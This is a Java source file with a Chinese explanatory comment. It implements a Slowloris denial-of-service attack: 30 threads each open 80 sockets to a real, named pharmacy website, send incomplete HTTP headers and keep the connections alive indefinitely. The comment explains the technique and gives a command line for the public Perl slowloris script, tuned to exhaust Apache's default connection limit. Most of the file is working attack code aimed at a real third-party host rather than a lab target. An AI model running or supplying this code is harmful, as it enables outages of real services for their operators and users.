package com.fung.hack.slowloris;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

/**
 * @author youthflies
 * 
 */
public class SlowlorisTest {

	/**
	 * @param args
	 * @throws IOException
	 * @throws UnknownHostException
	 * @throws InterruptedException
	 */
	
  public static class MyThread extends  Thread {
		public void run(){
			int count = 80;

			List<Socket> sockets = new ArrayList<Socket>();
			List<DataOutputStream> dataOutputStreams = new ArrayList<DataOutputStream>();

			// 建立连接
			for (int i = 1; i <= count; i++) {
				Socket client = null;
				try {
					client = new Socket("www.800pharm.com", 80);
					sockets.add(client);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				System.out.println("建立连接--" + i);
			}
			// 发送不完整http请求
			for (int j = 0; j <= sockets.size() - 1; j++) {

				try {
					DataOutputStream outputStream = new DataOutputStream(sockets
							.get(j).getOutputStream());
					dataOutputStreams.add(outputStream);
					outputStream.writeBytes(" GET / HTTP/1.1\r\n"
							+ "Host: www.800pharm.com:80\r\n"
							+ "Connection: keep-alive\r\n"
							+ "Content-Length: 42\r\n");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					sockets.remove(j);
					Socket client;
					try {
						client = new Socket("www.800pharm.com", 80);
						sockets.add(client);
						
						DataOutputStream outputStream = new DataOutputStream(client
								.getOutputStream());
						dataOutputStreams.add(outputStream);
						outputStream.writeBytes(" GET / HTTP/1.1\r\n"
								+ "Host: www.800pharm.com:80\r\n"
								+ "Connection: keep-alive\r\n"
								+ "Content-Length: 42\r\n");
						
					} catch (UnknownHostException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					
					
				}
				System.out.println("发送局部http请求---" + j);
			}

			// 保持连接
			while (true) {
				for (int i = 0; i <= dataOutputStreams.size() - 1; i++) {
					try {
						dataOutputStreams.get(i).writeBytes(
								"TimeStamp:" + System.currentTimeMillis());
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						dataOutputStreams.remove(i);
						Socket client;
						try {
							client = new Socket("www.800pharm.com", 80);
							sockets.add(client);
							
							DataOutputStream outputStream = new DataOutputStream(client
									.getOutputStream());
							dataOutputStreams.add(outputStream);
							outputStream.writeBytes(" GET / HTTP/1.1\r\n"
									+ "Host: www.800pharm.com:80\r\n"
									+ "Connection: keep-alive\r\n"
									+ "Content-Length: 42\r\n");
							
						} catch (UnknownHostException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}

						
					}
					System.out.println("发送数据保持连接" + System.currentTimeMillis());
					try {
						Thread.sleep(700);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		 
		}
	}
	
	public static void main(String[] args) throws InterruptedException,
			UnknownHostException {
		// TODO Auto-generated method stub
		 
		 for (int i=0;i<30;i++)
		 {
			 MyThread t= new SlowlorisTest.MyThread();
			 t.start();
		 }
		
	}
}

/*
 *DDOS攻击，中文翻译为分布式拒绝服务攻击，是利用客户端的请求，造成服务器资源过度占用，服务器忙于处理这些请求，一些合法的用户请求得不到处理，导致服务不可用。
 *常见的ddos攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击。其利用的是TCP协议设计中的缺陷，此处先避开不谈。

而Slowloris攻击则是利用web server的漏洞（或者说是参数配置不合理），直接造成拒绝服务。Slowloris是在2009年由著名Web安全专家RSnake提出的一种攻击方法，
其原理是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被
恶意连接占用，从而无法接受新的请求，导致拒绝服务。

怎么算是恶意的请求呢，可以构造一个局部http请求，也就是一个不完整的http请求。

一个正常的http请求，如下：


 

?
1
2
3
4
GET / HTTP/1.1\r\n
HOST: host\r\n
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET 
CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
Content-Length: 42\r\n\r\n
最后的两个\r\n表示http请求头结束，如果我们去掉一个\r\n就表示这么包没完成，那么服务器就会等待客户端继续发送这个包的剩余部分，此时客户端再发送任意HTTP头，
保持住连接即可。

X-a: b\r\n

当构造多个连接后，服务器的连接数很快就会达到上限。apache默认连接数150个，所以我们只要建立150个这样的连接，apache就无法再处理新的请求，拒绝服务。

对于Slowloris攻击，http://ckers.org/slowloris/提供了脚本，直接使用即可，是用perl写的，只要有perl的环境即可。
 perl slowloris.pl -dns  www.hostname.com -port 80 -timeout  200 -num 150 timeout不要设置太短，
 num是指建立多少个连接。运行一会，再看目标应用，应该连接数被占满。

知道了原理，我们也可以自己写代码，构造这样的请求。下面是用java写的一个简单的例子：

使用 ps -ef | grep httpd | wc -l 可以查看linux中apache的连接数量。

 */
